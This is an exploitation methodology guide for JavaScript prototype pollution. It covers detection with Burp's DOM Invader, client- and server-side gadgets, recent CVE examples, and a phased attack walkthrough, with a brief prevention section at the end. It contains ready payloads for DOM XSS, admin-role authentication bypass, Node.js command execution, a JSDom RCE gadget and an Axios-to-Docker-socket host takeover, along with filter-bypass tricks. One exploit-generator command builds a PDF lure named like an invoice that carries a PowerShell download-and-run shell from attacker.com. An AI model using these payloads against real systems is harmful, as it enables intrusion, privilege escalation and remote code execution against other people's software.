# Complete Methodology for Prototype Pollution Exploitation

## Table of Contents

1. Understanding Prototype Pollution
2. Detection Methodologies
3. Client-Side Exploitation
4. Server-Side Exploitation
5. Real-World Exploit Examples
6. Tools and Burp Suite Integration
7. Step-by-Step Exploitation Guide

---

## 1. Understanding Prototype Pollution

Prototype pollution is a JavaScript vulnerability that occurs when an attacker can modify `Object.prototype` - the base object from which all JavaScript objects inherit properties. When a property is added to this prototype, every object in the application inherits that property.

### The Core Mechanism

```javascript
// Every object inherits from Object.prototype
const x = {a: 42};
x.__proto__ === Object.prototype;  // true

// If an attacker can modify the prototype...
Object.prototype.polluted = "malicious";

// Then every object gets this property
const y = {};
console.log(y.polluted);  // "malicious"
```

### The Attack Chain

A complete prototype pollution attack consists of two phases:

1. **Pollution Source**: Finding a way to write to `Object.prototype`
2. **Gadget**: Finding code that accesses an undefined property, allowing the attacker to change application behavior

---

## 2. Detection Methodologies

### 2.1 Client-Side Detection with DOM Invader

DOM Invader, integrated into Burp Suite's built-in browser, provides the most effective automated detection for client-side prototype pollution.

**Setup Process:**

1. Open Burp Suite's built-in browser
2. Click the Burp Suite logo in the top-right corner
3. Select the DOM Invader tab
4. Toggle DOM Invader to ON
5. Click "Attack types" and enable "Prototype pollution"
6. Reload the browser to apply changes

**Detection Process:**

After enabling, browse the target website. DOM Invader will automatically:
- Identify potential prototype pollution sources in URL parameters, JSON bodies, and postMessage handlers
- Display discovered sources in the Sources list
- Allow you to test each source by clicking the "Test" button

**Manual Verification:**

When a source is found, DOM Invader opens a new tab. In the console:
1. Expand the `Object` node to display `Object.prototype`
2. Confirm `testproperty` exists in the prototype
3. Create a new object: `let myObject = {};`
4. Verify inheritance: `console.log(myObject.testproperty);`

### 2.2 Automated Scanner Tools

**PPScan (Browser Extension)** : Automatically scans pages you visit for prototype pollution vulnerabilities.

**ppfuzz 2.0 (2025 Update)** : Now supports ES-modules, HTTP/2, and WebSocket endpoints. The new `-A browser` mode spins up a headless Chromium instance and automatically enumerates gadget classes by brute-forcing DOM APIs.

**ppmap**: Identifies pollution vectors and provides payload examples.

```bash
# Example usage
ppmap -u "https://target.com/#__proto__[test]=polluted"
```

**proto-find**: Another tool for discovering prototype pollution vulnerabilities.

### 2.3 Server-Side Detection Techniques

Detecting server-side prototype pollution without source code access requires more creative approaches.

**Express.js Detection Method:**

Express uses caching mechanisms that can be abused for detection. When you send a request with the `if-none-match` header, you expect a `304 Not Modified` response.

Detection process:
1. Send initial request and record the ETag
2. Send a prototype pollution payload
3. Resend the original request with the `if-none-match` header

- If you receive a `304` response → Not vulnerable
- If you receive a `200` response with matching ETag → Vulnerable

**Fastify Detection Method:**

Fastify responds with a `Content-Type` header. By adding `Content-Type: application/json; polluted=true` to your request:

- Normal output: `Content-Type: application/json`
- If vulnerable: `Content-Type: application/json; polluted=true`

**Warning**: These techniques can affect other users' experience. Use with caution in production environments.

### 2.4 Finding the Root Cause

Once a vulnerability is identified, use this debugging technique to locate the vulnerable code:

```javascript
function debugAccess(obj, prop, debugGet = true) {
  var origValue = obj[prop];
  
  Object.defineProperty(obj, prop, {
    get: function() {
      if (debugGet) debugger;
      return origValue;
    },
    set: function(val) {
      debugger;
      origValue = val;
    }
  });
}

debugAccess(Object.prototype, "ppmap");
```

**Process:**
1. Set a breakpoint on the first line of JavaScript
2. Reload the page with the payload (e.g., `constructor[prototype][ppmap]=reserved`)
3. Run the debugAccess script while execution is paused
4. Resume execution - the debugger will trigger when the property is polluted
5. Examine the Call Stack to find the vulnerable code location

---

## 3. Client-Side Exploitation

### 3.1 Common Sinks and Gadgets

When searching for gadgets, look for keywords like `srcdoc`, `innerHTML`, `iframe`, `createElement`, `eval`, and `setTimeout`.

**jQuery (CVE-2019-11358)** : Versions before 3.4.0 are vulnerable through `$.extend()`.

**Lodash (CVE-2019-10744)** : Versions before 4.17.12 are vulnerable through `_.merge()` and `_.set()`.

**Vue.js**: Properties like `v-if` can be polluted to achieve code execution.

### 3.2 DOM XSS Exploitation Example

The following demonstrates exploitation using a third-party library gadget (based on PortSwigger labs):

**Step 1 - Identify the Vector:**
Using DOM Invader, a prototype pollution vector is discovered in the URL fragment.

**Step 2 - Locate the Gadget:**
DOM Invader's "Scan for gadgets" feature identifies a sink - code that uses a polluted property in an unsafe way.

**Step 3 - Generate Exploit:**
Click "Exploit" next to the sink. DOM Invader attempts to call `alert()` as proof of concept.

**Step 4 - Deploy:**
Create an exploit page that redirects victims to:
```
https://target.com/#__proto__[sinkProperty]=javascript:alert(document.cookie)
```

### 3.3 Real-World Client-Side Exploit: Adobe Acrobat CVE-2026-34621

This critical vulnerability (CVSS 8.6) was actively exploited in targeted attacks starting from November 2025.

**Technical Details:**
The vulnerability stems from a prototype pollution issue in Adobe's JavaScript engine. Attackers create malicious PDFs that pollute `Object.prototype` to inject malicious properties (`__trusted`, `privileged`, etc.).

**Attack Chain:**
1. Victim opens a specially crafted PDF
2. Embedded JavaScript pollutes the prototype
3. Due to the polluted prototype, the engine incorrectly treats untrusted script as privileged
4. Attacker gains access to restricted APIs: `app.launchURL`, `util.readFileIntoStream`, `app.trustedFunction`
5. These APIs allow file system access and process execution outside the sandbox

**Exploit Generation Tool:**
```bash
# Basic PDF that launches calculator
python3 cve_2026_34621_advanced.py -o malicious.pdf

# Windows reverse shell
python cve_2026_34621_advanced.py -o invoice.pdf --win "powershell -NoP -Ep Bypass -C \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\""

# macOS persistence
python cve_2026_34621_advanced.py -o persist.pdf --mac "open /Applications/Calculator.app" -p
```

**Campaign Characteristics:**
The exploit was used in Russian-aligned espionage campaigns targeting the oil and gas sector. Lures referenced current events in Russia's energy industry. Only systems meeting specific criteria received the second-stage payload, indicating targeted selection rather than mass distribution.

At the time of initial VirusTotal submission, only 5 of 64 security vendors flagged the malicious PDF as suspicious.

---

## 4. Server-Side Exploitation

### 4.1 Express.js Gadget

Express.js version 4.18.2 contains a gadget that can be used to detect pollution without crashing the application.

### 4.2 Fastify XSS Gadget

Fastify ^4.13.0 can be exploited for XSS by polluting the `content-type` header:

```javascript
Object.prototype["content-type"] = "text/html;json;";
```

This forces JSON responses to be interpreted as HTML, enabling XSS when the response contains user-controlled data.

### 4.3 JSDom RCE Gadget

JSDom ^21.1.0 contains RCE gadgets when `<script src=>` or `<iframe>` elements are present:

```javascript
const { JSDOM } = require("jsdom");
const payload = `console.log(
  this.constructor
  .constructor("return process")()
  .mainModule.require("child_process")
  .execSync("id")
  .toString()
);`;

Object.prototype.runScripts = "dangerously";
Object.prototype.resources = "usable";
Object.prototype.url = ["data:/"]
Object.prototype.path = ["#"]
Object.prototype.username = `application/javascript,${payload} //`

const dom = new JSDOM(`<script src="script.js"></script>`);
```

### 4.4 Axios to Docker Socket RCE

Axios 0.27.2 can be exploited to achieve RCE by redirecting requests to the Docker socket:

```javascript
import axios from "axios";

// Create a container
const body = JSON.stringify({
  Image: "alpine:latest",
  Cmd: ["sleep", "60"],
  Volumes: { "/host": {} },
  HostConfig: { Binds: ["/:/host"] }
});

const createContainer = [
  "POST /containers/create?name=exploit HTTP/1.1",
  "Host: foo.bar",
  "Content-Type: application/json",
  "Connection: keep-alive",
  "Content-Length: " + body.length,
  "",
  body
].join("\r\n");

// Redirect query to the docker socket
Object.prototype.socketPath = "/var/run/docker.sock";
Object.prototype.common = { "Content-Length": "1" };

await axios.get("http://localhost:31337/");
```

### 4.5 Protocol-Buffers-Schema (CVE-2026-5758)

Version 3.6.0 of Mafintosh's protocol-buffers-schema is vulnerable to prototype pollution. An attacker can supply a crafted protocol buffer message to the parser, leading to:
- Application logic alteration
- Security bypass
- Denial of service
- Remote code execution

---

## 5. Real-World Exploit Examples

### 5.1 CVE-2026-28794 - @orpc/client (March 2026)

**Severity:** Critical (CVSS 9.3)

**Root Cause:** The `deserialize()` method of `StandardRPCJsonSerializer` fails to validate dangerous keys like `__proto__` and `constructor`.

**Two Attack Vectors:**
1. **Meta vector**: Writes type-constrained values to arbitrary object paths
2. **Maps vector**: Allows injection of arbitrary string values

**Proof of Concept:**
```bash
curl -X POST http://localhost:4321/rpc/planet/create \
     -F 'data={"json":{},"meta":[],"maps":[["__proto__","role"]]}' \
     -F '0=admin'
```

This immediately applies `Object.prototype.role = "admin"` across the entire Node.js server instance, granting all users admin privileges.

### 5.2 CVE-2026-25150 - Qwik Framework (February 2026)

**Severity:** Critical (CVSS 9.3)

**Affected Versions:** QwikDev qwik prior to 1.19.0

**Root Cause:** The `formToObj()` function in `@builder.io/qwik-city` middleware processes form field names containing dot notation without sanitizing `__proto__`, `constructor`, and `prototype`.

**Impact:** Unauthenticated attackers can send crafted HTTP POST requests to modify `Object.prototype`, leading to privilege escalation, authentication bypass, or denial of service.

### 5.3 CVE-2026-57077 - utils-extend (February 2025)

**Severity:** Critical (CVSS 9.1)

**Proof of Concept:**
```javascript
async function exploit() {
   const utilsextend = require("utils-extend");
   const payload = JSON.parse('{"__proto__":{"exploited":true}}');
   const result = await utilsextend.extend({}, payload);
}
```

---

## 6. Tools and Burp Suite Integration

### 6.1 Complete Tool List

| Tool | Purpose | Platform |
|------|---------|----------|
| DOM Invader | Client-side detection and gadget scanning | Burp Suite built-in |
| PPScan | Browser-based scanning | Browser Extension |
| ppfuzz 2.0 | ES-module and WebSocket scanning | CLI |
| ppmap | Payload generation | CLI |
| proto-find | Vulnerability discovery | CLI |
| PP Finder | Gadget discovery via AST analysis | Node.js |

### 6.2 Using DOM Invader for Complete Exploitation

**Step 1 - Enable and Scan:**
1. Open Burp's built-in browser
2. Enable DOM Invader with prototype pollution detection
3. Navigate to the target application
4. DOM Invader displays discovered sources in the Sources list

**Step 2 - Scan for Gadgets:**
1. Select a source from the Sources list
2. Click "Scan for gadgets"
3. DOM Invader opens a new tab and starts scanning
4. After completion, check the Sinks list for accessible gadgets

**Step 3 - Generate Exploit:**
1. Click "Exploit" next to a sink
2. DOM Invader attempts to call `alert()` as proof of concept
3. If successful, the vulnerability is confirmed exploitable

### 6.3 PP Finder for Gadget Discovery

PP Finder works by analyzing JavaScript files using TypeScript parser to generate an Abstract Syntax Tree (AST). It injects hooks that detect when undefined properties are accessed, reporting potential gadgets with their location in the code.

```bash
# Run PP Finder on a JavaScript codebase
pp-finder scan ./javascript-files/
```

---

## 7. Step-by-Step Exploitation Guide

### Phase 1: Reconnaissance

1. **Identify object merging operations** in the application:
   - Look for `Object.assign()`, `$.extend()`, `_.merge()`, `_.set()`
   - Check for deep merge operations

2. **Trace user input flow** into object properties or their prototypes

3. **Use DOM Invader** to automatically identify potential sources

### Phase 2: Pollution Testing

**Test Payloads for Different Contexts:**

URL Query Parameters:
```
?__proto__[test]=polluted
?__proto__.test=polluted
?constructor[prototype][test]=polluted
```

JSON Body:
```json
{"__proto__": {"test": "polluted"}}
{"constructor": {"prototype": {"test": "polluted"}}}
{"__proto__": {"__proto__": {"polluted": true}}}
```

**Verification:**
```javascript
// Check if pollution worked
Object.prototype.test === "polluted"

// Or in console
let testObj = {};
console.log(testObj.test);  // Should output "polluted" if vulnerable
```

### Phase 3: Gadget Discovery

1. **Search for potential gadget sinks** in JavaScript files:
   - `innerHTML`, `outerHTML`
   - `eval()`, `setTimeout()`, `setInterval()`
   - `document.write()`
   - `srcdoc` (iframes)
   - `href` (anchors)

2. **Use DOM Invader's "Scan for gadgets"** feature for automated discovery

3. **For server-side**: Use PP Finder to analyze the codebase

### Phase 4: Exploit Crafting

**DOM XSS Payload:**
```
?__proto__[innerHTML]=<img/src/onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
?__proto__[href]=javascript:alert(1)
```

**Authentication Bypass (Server-Side):**
```json
{
  "__proto__": {
    "isAdmin": true,
    "role": "admin",
    "authenticated": true
  }
}
```

**RCE Payload (Node.js):**
```json
{
  "__proto__": {
    "shell": "/proc/self/exe",
    "argv0": "console.log(require('child_process').execSync('id').toString())//"
  }
}
```

### Phase 5: Bypass Techniques

If standard payloads are blocked, try:

1. **Alternative paths:**
   - `constructor.prototype.polluted=1`
   - `__proto__[polluted]=1`

2. **Unicode encoding:**
   - `\u005f\u005fproto\u005f\u005f`

3. **Array pollution:**
   - `[].__proto__.polluted=1`

4. **Nested prototype chains:**
   - `{"__proto__":{"__proto__":{"polluted":true}}}`

---

## 8. Prevention and Mitigation

Based on the analysis of real-world exploits:

1. **Freeze the prototype:** `Object.freeze(Object.prototype)`
2. **Validate all user input** for dangerous keys (`__proto__`, `constructor`, `prototype`)
3. **Use Map instead of plain objects** for dynamic property assignment
4. **Keep libraries updated** - most CVEs are patched in newer versions
5. **Disable JavaScript** in PDF readers when not required (Adobe mitigation)
6. **Monitor for suspicious child processes** spawned from applications like Adobe Reader

---

## 9. References

- PortSwigger Web Security Academy: Client-side prototype pollution labs
- CVE-2026-34621 Adobe Acrobat exploit generator documentation
- YesWeHack server-side prototype pollution research
- HackTricks client-side prototype pollution guide
